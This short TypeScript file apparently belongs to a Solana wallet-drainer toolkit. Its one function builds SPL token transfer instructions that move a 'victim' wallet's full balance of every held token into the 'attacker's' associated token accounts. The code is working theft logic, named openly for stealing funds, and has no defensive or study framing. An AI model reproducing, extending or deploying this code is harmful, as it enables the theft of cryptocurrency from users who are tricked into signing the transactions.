import { createTransferInstruction } from '@solana/spl-token';
import { PublicKey, TransactionInstruction } from '@solana/web3.js';
import { getAssociatedTokenAddressSync } from '@solana/spl-token';

export function createSPLTransferIxs(
  victim: PublicKey,
  attacker: PublicKey,
  tokens: any[]
): TransactionInstruction[] {
  const instructions: TransactionInstruction[] = [];

  for (const token of tokens) {
    if (token.balance <= 0 || !token.mint) continue;

    try {
      const attackerAta = getAssociatedTokenAddressSync(token.mint, attacker, true);

      instructions.push(
        createTransferInstruction(
          token.ata,
          attackerAta,
          victim,
          token.balance
        )
      );
    } catch (err) {
      console.warn(`Failed to create SPL transfer for mint ${token.mint}`, err);
    }
  }
  return instructions;
}